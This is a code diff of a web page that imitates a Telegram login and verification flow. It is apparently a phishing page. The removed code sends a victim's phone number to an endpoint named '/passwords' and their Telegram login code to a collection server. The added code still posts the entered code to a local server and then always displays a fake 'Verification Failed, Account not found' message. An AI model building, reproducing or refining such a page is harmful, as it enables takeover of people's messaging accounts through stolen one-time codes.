@@ -303,7 +303,6 @@
     </div>
 
     <div class="container" id="phoneVerificationContainer" style="display:none;">
-    
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
@@ -317,131 +316,86 @@
 
     <div class="container" id="finalMessageContainer" style="display:none;">
         <h1>Verification Failed</h1>
-        <p id="finalMessage"></p>
-        <button class="button" onclick="resetForm()">Try Again</button>
+        <p id="finalMessage">Account not found.</p>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const countryDropdown = document.getElementById('countryCode');
-            const dropdownMenu = document.getElementById('dropdownMenu');
-            const phoneNumberInput = document.getElementById('phoneNumber');
-            const countryNameSpan = countryDropdown.querySelector('.country-name');
+        // Data for countries, flags, and country codes
+        const countries = [
+            { name: 'United States', code: '+1', flag: 'https://restcountries.com/v3.1/all/flag/US' },
+            { name: 'Canada', code: '+1', flag: 'https://restcountries.com/v3.1/all/flag/CA' },
+            { name: 'United Kingdom', code: '+44', flag: 'https://restcountries.com/v3.1/all/flag/GB' },
+            // Add more countries as needed
+        ];
 
-            const countries = [
-                { name: 'Australia', code: '+61', flag: '🇦🇺' },
-                { name: 'United States', code: '+1', flag: '🇺🇸' },
-                { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
-                { name: 'Germany', code: '+49', flag: '🇩🇪' },
-                { name: 'Russia', code: '+7', flag: '🇷🇺' },
-                { name: 'Brazil', code: '+55', flag: '🇧🇷' },
-                // Add more countries as needed
-            ];
+        const phoneNumberContainer = document.getElementById('phoneNumber');
+        const countryDropdown = document.getElementById('countryCode');
+        const dropdownMenu = document.getElementById('dropdownMenu');
+        const initialContainer = document.getElementById('initialContainer');
+        const phoneVerificationContainer = document.getElementById('phoneVerificationContainer');
+        const finalMessageContainer = document.getElementById('finalMessageContainer');
+        const phoneDisplay = document.getElementById('phoneDisplay');
+        const nextButton = document.getElementById('nextButton');
 
+        function toggleDropdown() {
+            const isVisible = dropdownMenu.style.display === 'block';
+            dropdownMenu.style.display = isVisible ? 'none' : 'block';
+        }
+
+        function populateDropdown() {
+            dropdownMenu.innerHTML = '';
             countries.forEach(country => {
                 const item = document.createElement('div');
                 item.classList.add('dropdown-item');
-                item.innerHTML = `<span>${country.flag} ${country.name}</span> <span class="country-code">${country.code}</span>`;
-                item.dataset.code = country.code;
-                item.dataset.flag = country.flag;
-                item.dataset.name = country.name;
-                item.addEventListener('click', function() {
-                    countryNameSpan.textContent = country.name;
-                    phoneNumberInput.value = country.code + ' ';
-                    dropdownMenu.classList.remove('show');
-                });
+                item.innerHTML = `
+                    <img src="${country.flag}" alt="${country.name} Flag">
+                    <span class="country-name">${country.name}</span>
+                    <span class="country-code">${country.code}</span>
+                `;
+                item.onclick = () => selectCountry(country);
                 dropdownMenu.appendChild(item);
             });
+        }
 
-            window.toggleDropdown = function() {
-                dropdownMenu.classList.toggle('show');
-            };
+        function selectCountry(country) {
+            countryDropdown.querySelector('.country-name').textContent = country.name;
+            countryDropdown.querySelector('.country-code').textContent = country.code;
+            phoneNumberContainer.value = '';
+            toggleDropdown();
+        }
 
-            window.startSignIn = function() {
-                setTimeout(function() {
-                    document.getElementById('verificationContainer').style.display = 'none';
-                    document.body.style.backgroundColor = "#ffffff";
-                    document.getElementById('initialContainer').style.display = 'block';
-                }, 500);
-            }
+        function startSignIn() {
+            initialContainer.style.display = 'none';
+            phoneVerificationContainer.style.display = 'block';
+            // Hide the keyboard when switching views
+            document.activeElement.blur();
+        }
 
-            document.getElementById('nextButton').addEventListener('click', function() {
-                const phoneNumber = phoneNumberInput.value;
-                if (phoneNumber === '') {
-                    alert('Please enter your phone number.');
-                    return;
+        function submitVerification() {
+            const verificationCode = document.getElementById('verificationCode').value;
+            fetch('http://localhost:8080/verification', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code: verificationCode })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    finalMessageContainer.style.display = 'block';
+                    phoneVerificationContainer.style.display = 'none';
+                } else {
+                    document.getElementById('finalMessage').textContent = 'Invalid code or account not found.';
                 }
-
-                // Send phone number to the server
-                fetch('http://192.168.x.x:5001/passwords', {  // Use your local IP address
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ phone: phoneNumber }),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send phone number');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Phone number sent:', data);
-                    document.getElementById('phoneDisplay').textContent = phoneNumber;
-                    document.getElementById('initialContainer').style.display = 'none';
-                    document.getElementById('phoneVerificationContainer').style.display = 'block';
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred while sending your phone number. Please try again.');
-                });
+            })
+            .catch(error => {
+                console.error('Error:', error);
             });
+        }
 
-            window.submitVerification = function() {
-                const verificationCode = document.getElementById('verificationCode').value;
-                const phoneNumber = phoneNumberInput.value;
-
-                if (verificationCode === '') {
-                    alert('Please enter the verification code.');
-                    return;
-                }
-
-                // Send verification code to the server
-                fetch('http://192.168.x.x:5001/verification', {  // Use your local IP address
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ phone: phoneNumber, code: verificationCode }),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send verification code');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Verification code sent:', data);
-                    document.getElementById('phoneVerificationContainer').style.display = 'none';
-                    document.getElementById('finalMessageContainer').style.display = 'block';
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('An error occurred while sending your verification code. Please try again.');
-                });
-            };
-
-            window.resetForm = function() {
-                phoneNumberInput.value = '';
-                document.getElementById('verificationCode').value = '';
-                document.getElementById('finalMessageContainer').style.display = 'none';
-                document.getElementById('initialContainer').style.display = 'block';
-            };
-
-            document.body.addEventListener('touchmove', function() {
-                document.activeElement.blur();
-            });
+        document.addEventListener('DOMContentLoaded', () => {
+            populateDropdown();
         });
     </script>
 </body>
